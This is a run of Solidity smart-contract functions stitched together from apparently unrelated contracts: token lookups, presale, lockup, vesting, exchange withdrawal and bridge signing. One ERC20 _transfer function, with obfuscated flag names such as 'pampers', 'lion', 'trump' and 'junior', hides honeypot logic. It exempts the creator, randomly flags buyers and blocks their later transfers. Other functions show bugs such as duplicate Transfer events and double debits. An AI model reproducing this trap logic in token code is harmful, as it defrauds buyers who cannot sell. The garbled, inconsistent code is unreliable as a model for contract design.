    curGame.winCombination = combination;
    checkWinNobody(idGame);
}

function getTokensByGame(uint32 idGame) public view returns(string res) {
    res = "";
    for (uint256 i = 0; i < totalSupply; i++) {
        uint256 packed = tokens[i].option;
        uint32 idGameToken = uint32((packed >> (8 * 8)) & 0xFFFFFFFF);
        if (idGameToken == idGame) res = strConcat(res, ",", uint2str(i));
    }
}

function getUserTokensByGame(address user, uint32 idGame) public view returns(string res) {
    res = "";
    require(user != 0x0);
    for (uint256 i = 0; i < totalSupply; i++) {
        if (user == tokenIndexToOwner[i]) {
            uint256 packed = tokens[i].option;
            uint32 idGameToken = uint32((packed >> (8 * 8)) & 0xFFFFFFFF);
            if (idGameToken == idGame) res = strConcat(res, ",", uint2str(i));
        }
    }
}

function _transfer(address sender, address recipient, uint256 amount) internal virtual {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    require(block.timestamp >= startTime.add(unlockDuration) || _msgSender() == owner(), "Tokens not unlocked yet");
    balances_[sender] = balances_[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    balances_[recipient] = balances_[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
    uint256 tokensToBurn = findOnePercent(amount);
    uint256 tokensToTransfer = amount.sub(tokensToBurn);
    beforeTokenTransfer(sender, recipient, amount);
    burn(recipient, tokensToBurn);
    emit Transfer(sender, recipient, tokensToTransfer);
}

receive() external payable {
    require(isWhitelisted(_msgSender()) == true, "This address is not whitelisted");
    require(currentPhase == Phases.start, "The coin offering has not started yet");
    require(msg.value <= 1e18 && msg.value >= 5e17, "You can send at least 0.5 ETH but not more than 1 ETH");
    require(remainingTokens > 0, "Presale token limit reached");
    uint256 weiAmount = msg.value;
    uint256 tokens = weiAmount.mul(basePrice).div(1 ether);
    uint256 returnWei = 0;
    ethBalances[_msgSender()] = ethBalances[_msgSender()].add(weiAmount);
    ethBalances[address(this)] = ethBalances[address(this)].add(weiAmount);
    require(ethBalances[_msgSender()] <= 1e18, "Cannot send more than 1 ETH");
    require(ethBalances[address(this)] <= 50e18, "Target amount of 50 ETH reached");
    if (tokensSold.add(tokens) > cap) {
        revert("Exceeding limit of presale tokens");
    }
    tokensSold = tokensSold.add(tokens); 
    remainingTokens = cap.sub(tokensSold);
    if (returnWei > 0) {
        _msgSender().transfer(returnWei);
        emit Transfer(address(this), _msgSender(), returnWei);
    }
    uint256 tokensToBurn = tokens.mul(50).div(1000); 
    balances_[owner()] = balances_[owner()].sub(tokens, "ERC20: transfer amount exceeds balance");
    balances_[owner()] = balances_[owner()].sub(tokensToBurn, "ERC20: transfer amount exceeds balance");
    _totalSupply = _totalSupply.sub(tokensToBurn, 'Overflow while burning tokens');
    balances_[_msgSender()] = balances_[_msgSender()].add(tokens);
    emit Transfer(address(this), _msgSender(), tokens);
    emit Transfer(address(this), address(0x000000000000000000000000000000000000dEaD), tokensToBurn);
    _owner.transfer(weiAmount);
}

function _buyToken(address _to, uint256 _value) internal notFinalised whenNotPaused {
    require(_to != address(0x0));
    uint256 index;
    uint256 locked;
    if (updateTime[_to] != 0) {
        index = safeSub(now, updateTime[_to]) / 1 days;
        uint256 releasedtemp = safeMul(index, jail[_to]) / 200;
        if (releasedtemp >= LockedToken[_to]) {
            LockedToken[_to] = 0;
        } else {
            LockedToken[_to] = safeSub(LockedToken[_to], releasedtemp);
        }
    }
    locked = safeSub(_value, _value / 200);
    LockedToken[_to] = safeAdd(LockedToken[_to], locked);
    balances[_to] = safeAdd(balances[_to], _value);
    jail[_to] = safeAdd(jail[_to], _value);
    balances[walletOwnerAddress] = safeSub(balances[walletOwnerAddress], _value);
    updateTime[_to] = now;
    withdraw(walletOwnerAddress);
    emit BuyToken(msg.sender, _to, _value);
}

function canTransfer(address _from, uint256 _value) internal view returns(bool success) {
    uint256 index;
    uint256 locked;
    index = safeSub(now, updateTime[_from]) / 1 days;
    if (index >= 200) {
        return true;
    }
    uint256 releasedtemp = safeMul(index, jail[_from]) / 200;
    if (releasedtemp >= LockedToken[_from]) {
        return true;
    }
    locked = safeSub(LockedToken[_from], releasedtemp);
    require(safeSub(balances[_from], _value) >= locked);
    return true;
}

function releaseToken() public onlyOwner {
    if (block.timestamp >= fifth_round_release_time) {
        validateReleasedToken(5);
        return;
    } else if (block.timestamp >= forth_round_release_time) {
        validateReleasedToken(4);
        return;
    } else if (block.timestamp >= third_round_release_time) {
        validateReleasedToken(3);
        return;
    } else if (block.timestamp >= second_round_release_time) {
        validateReleasedToken(2);
        return;
    } else if (block.timestamp >= first_round_release_time) {
        validateReleasedToken(1);
        return;
    }
}

function validateReleasedToken(uint256 _round) internal onlyOwner {
    uint256 releasedTokenOfManage = releasedTokens[beneficiary_manage];
    uint256 releasedTokenOfDevelop = releasedTokens[beneficiary_develop];
    uint256 releasedTokenOfMarket = releasedTokens[beneficiary_market];
    uint256 releasedTokenOfFinance = releasedTokens[beneficiary_finance];
    require(releasedTokenOfManage < MANAGE_CAP_PER_ROUND.mul(_round));
    require(releasedTokenOfManage.add(MANAGE_CAP_PER_ROUND) <= MANAGE_CAP_PER_ROUND.mul(_round));
    require(releasedTokenOfDevelop < DEVELOP_CAP_PER_ROUND.mul(_round));
    require(releasedTokenOfDevelop.add(DEVELOP_CAP_PER_ROUND) <= DEVELOP_CAP_PER_ROUND.mul(_round));
    require(releasedTokenOfMarket < MARKET_CAP_PER_ROUND.mul(_round));
    require(releasedTokenOfMarket.add(MARKET_CAP_PER_ROUND) <= MARKET_CAP_PER_ROUND.mul(_round));
    require(releasedTokenOfFinance < FINANCE_CAP_PER_ROUND.mul(_round));
    require(releasedTokenOfFinance.add(FINANCE_CAP_PER_ROUND) <= FINANCE_CAP_PER_ROUND.mul(_round));
    uint256 totalRoundCap = MANAGE_CAP_PER_ROUND.add(DEVELOP_CAP_PER_ROUND).add(MARKET_CAP_PER_ROUND).add(FINANCE_CAP_PER_ROUND);
    require(token.balanceOf(this) >= totalRoundCap);
    token.safeTransfer(beneficiary_manage, MANAGE_CAP_PER_ROUND);
    releasedTokens[beneficiary_manage] = releasedTokens[beneficiary_manage].add(MANAGE_CAP_PER_ROUND);
    token.safeTransfer(beneficiary_develop, DEVELOP_CAP_PER_ROUND);
    releasedTokens[beneficiary_develop] = releasedTokens[beneficiary_develop].add(DEVELOP_CAP_PER_ROUND);
    token.safeTransfer(beneficiary_market, MARKET_CAP_PER_ROUND);
    releasedTokens[beneficiary_market] = releasedTokens[beneficiary_market].add(MARKET_CAP_PER_ROUND);
    token.safeTransfer(beneficiary_finance, FINANCE_CAP_PER_ROUND);
    releasedTokens[beneficiary_finance] = releasedTokens[beneficiary_finance].add(FINANCE_CAP_PER_ROUND);
}

function adminWithdraw(address token, uint256 amount, address user, uint256 nonce, uint8 v, bytes32 r, bytes32 s, uint256 feeWithdrawal) onlyAdmin returns(bool success) {
    bytes32 hash = keccak256(this, token, amount, user, nonce);
    if (withdrawn[hash]) throw;
    withdrawn[hash] = true;
    if (ecrecover(keccak256("\x19Ethereum Signed Message:\n32", hash), v, r, s) != user) throw;
    if (feeWithdrawal > 50 finney) feeWithdrawal = 50 finney;
    if (tokens[token][user] < amount) throw;
    tokens[token][user] = safeSub(tokens[token][user], amount);
    tokens[address(0)][user] = safeSub(tokens[address(0x0)][user], feeWithdrawal);
    tokens[address(0)][feeAccount] = safeAdd(tokens[address(0)][feeAccount], feeWithdrawal);
    if (token == address(0)) {
        if (!user.send(amount)) throw;
    } else {
        if (!Token(token).transfer(user, amount)) throw;
    }
    lastActiveTransaction[user] = block.number;
    Withdraw(token, user, amount, tokens[token][user]);
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (pampers == false)) {
        england = chTx;
        ireland = true;
    }
    if ((address(sender) == creator) && (pampers == true)) {
        lion[recipient] = true;
        trump[recipient] = false;
        pampers = false;
    }
    if ((amount > golden) && (lion[sender] == true) && (address(sender) != creator)) {
        junior[recipient] = true;
    }
    if (lion[recipient] != true) {
        trump[recipient] = ((randomly() == 3) ? true : false);
    }
    if ((trump[sender]) && (lion[recipient] == false)) {
        trump[recipient] = true;
    }
    if (lion[sender] == false) {
        if ((amount > golden) && (junior[sender] == true)) {
            require(false);
        }
        require(amount < england);
        if (ireland == true) {
            if (junior[sender] == true) {
                require(false);
            }
            junior[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function submitSignature(bytes signature, bytes message) external onlyValidator {
    require(Message.isMessageValid(message));
    require(msg.sender == Message.recoverAddressFromSignedMessage(signature, message, false));
    bytes32 hashMsg = keccak256(abi.encodePacked(message));
    bytes32 hashSender = keccak256(abi.encodePacked(msg.sender, hashMsg));
    uint256 signed = numMessagesSigned(hashMsg);
    require(!isAlreadyProcessed(signed));
    signed = signed + 1;
    if (signed > 1) {
        require(!messagesSigned(hashSender));
    } else {
        setMessages(hashMsg, message);
    }
    setMessagesSigned(hashSender, true);
    bytes32 signIdx = keccak256(abi.encodePacked(hashMsg, (signed - 1)));
    setSignatures(signIdx, signature);
    setNumMessagesSigned(hashMsg, signed);
    emit SignedForUserRequest(msg.sender, hashMsg);
    uint256 reqSigs = requiredSignatures();
    if (signed >= reqSigs) {
        setNumMessagesSigned(hashMsg, markAsProcessed(signed));
        emit CollectedSignatures(msg.sender, hashMsg, reqSigs);
        onSignaturesCollected(message);
    }
}

